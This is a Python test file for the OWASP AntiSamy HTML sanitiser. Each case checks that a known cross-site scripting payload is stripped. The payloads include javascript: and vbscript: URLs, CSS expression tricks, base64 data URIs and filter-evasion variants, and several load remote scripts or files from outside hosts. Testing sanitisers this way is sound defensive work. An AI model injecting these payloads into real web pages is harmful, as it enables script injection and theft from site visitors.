from nose.tools import assert_equals
from owasp.antisamy.policy import Policy
from owasp.antisamy.scanner import scan

class BasePolicyTest(object):

    source = ""
    expected = ""

    def setup(self):
        self.policy = Policy()
        self.results = scan(self.source, self.policy)
        self.cleaned = self.results.clean_html

    def test_that_cleaned_version_matches_expected(self):
        assert_equals(self.cleaned, self.expected)

    def teardown(self):
        pass


class TestCssJavascriptInjectInLinkHref(BasePolicyTest):
    source = """<LINK REL="stylesheet" HREF="javascript:alert('XSS')">"""
    expected = """<LINK REL="stylesheet">"""


class TestCssCrossDomainLinkHref(BasePolicyTest):
    source = """<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">"""
    expected = """<LINK REL="stylesheet">"""


class TestCssImportCrossDomain(BasePolicyTest):
    source = """<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>"""
    expected = """<STYLE></STYLE>"""


class TestCssMozBindingCrossDomain(BasePolicyTest):
    source = """<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>"""


class TestCssListStyleImageJavascriptInject(BasePolicyTest):
    source = """<STYLE>li {list-style-image: url("javascript:alert('XSS')")}</STYLE><UL><LI>XSS"""


class TestCssImportJavascriptInjectWithDelimiters(BasePolicyTest):
    source = """<STYLE>@im\\port'\\ja\\vasc\\ript:alert(\"XSS\")';</STYLE>"""


class TestImageSrcVbscriptInject(BasePolicyTest):
    source = "<IMG SRC='vbscript:msgbox(\"XSS\")'>"


class TestMetaTagJavascriptXss(BasePolicyTest):
    source = """<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS')">"""
    expected = ""


class TestMetaTagJavascriptXssWithDoubleUrl(BasePolicyTest):
    source = """<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert('XSS')">"""
    expected = ""


class TestMetaTagJavascriptXssWithBase64(BasePolicyTest):
    source = """<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">"""
    expected = ""


class TestIframeJavascriptXss(BasePolicyTest):
    source = """<IFRAME SRC="javascript:alert('XSS')"></IFRAME>"""
    expected = ""


class TestFramesetJavascriptXss(BasePolicyTest):
    source = """<FRAMESET><FRAME SRC="javascript:alert('XSS')"></FRAMESET>"""


class TestTableBackgroundJavascriptXss(BasePolicyTest):
    source = """<TABLE BACKGROUND="javascript:alert('XSS')">"""
    expected = """<TABLE>"""


class TestTDBackgroundJavascriptXss(BasePolicyTest):
    source = """<TABLE><TD BACKGROUND="javascript:alert('XSS')">"""
    expected = """<TABLE><TD>"""


class TestInlineStyleJavascriptXss(BasePolicyTest):
    source = """<DIV STYLE="background-image: url(javascript:alert('XSS'))">"""
    expected = """<DIV>"""


class TestInlineStyleExpressionJavascriptXss(BasePolicyTest):
    source = """<DIV STYLE="width: expression(alert('XSS'))">"""
    expected = """<DIV>"""


class TestInlineStyleExpressionWithCommentJavascriptXss(BasePolicyTest):
    source = """<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">"""
    expected = """<IMG>"""


class TestBaseHrefJavascriptXss(BasePolicyTest):
    source = """<BASE HREF="javascript:alert('XSS')//">"""
    expected = "<BASE>"


class TestBaseHrefCaseSensitiveJavascriptXss(BasePolicyTest):
    source = """<BaSe hReF="http://arbitrary.com/">"""
    expected = ""


class TestObjectTagCrossDomain(BasePolicyTest):
    source = """<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>"""
    expected = ""


class TestObjectTagParamJavascriptXss(BasePolicyTest):
    source = """<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>"""
    expected = ""


class TestEmbedTagCrossDomain(BasePolicyTest):
    source = """<EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>"""
    expected = ""


class TestEmbedTagB64EncodedJavascriptXss(BasePolicyTest):
    source = """<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAwIiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlhTUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>"""
    expected = ""


class TestScriptTag(BasePolicyTest):
    source = """<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>"""
    expected = ""


class TestScriptTag2(BasePolicyTest):
    source = """<SCRIPT SRC=http://ha.ckers.org/xss.js>"""
    expected = ""


class TestScriptTagWithFakeEscape(BasePolicyTest):
    source = """<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>"""
    expected = ""


class TestScriptTagWithFakeEscape2(BasePolicyTest):
    source = """<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>"""
    expected = ""


class TestScriptTagWithFakeEscape3(BasePolicyTest):
    source = """<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>"""
    expected = ""


class TestScriptTagWithFakeEscape4(BasePolicyTest):
    source = """<SCRIPT>document.write("<SCRI")</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>"""
    expected = ""


class TestDivTagEntityEncoded(BasePolicyTest):
    source = """<div/style=&#92&#45&#92&#109&#111&#92&#122&#92&#45&#98&#92&#105&#92&#110&#100&#92&#105&#110&#92&#103:&#92&#117&#114&#108&#40&#47&#47&#98&#117&#115&#105&#110&#101&#115&#115&#92&#105&#92&#110&#102&#111&#46&#99&#111&#46&#117&#107&#92&#47&#108&#97&#98&#115&#92&#47&#120&#98&#108&#92&#47&#120&#98&#108&#92&#46&#120&#109&#108&#92&#35&#120&#115&#115&#41&>"""
    expected = """<div>"""


class TestAimProtocol(BasePolicyTest):
    source = """<a href='aim: &c:\\windows\\system32\\calc.exe' ini='C:\\Documents and Settings\\All Users\\Start Menu\\Programs\\Startup\\pwnd.bat'>"""
    expected = "<a>"


class TestJavascriptXssHiddenInHtmlComments(BasePolicyTest):
    source = """<!--
    <A href=
    - --><a href=javascript:alert:document.domain>test-->"""
    expected = ""


class TestCssExpressionHiddenInClosingTag(BasePolicyTest):
    source = """<a></a style=""xx:expr/**/ession(document.appendChild(document.createElement('script')).src='http://h4k.in/i.js')">"""
    expected = "<a></a>"
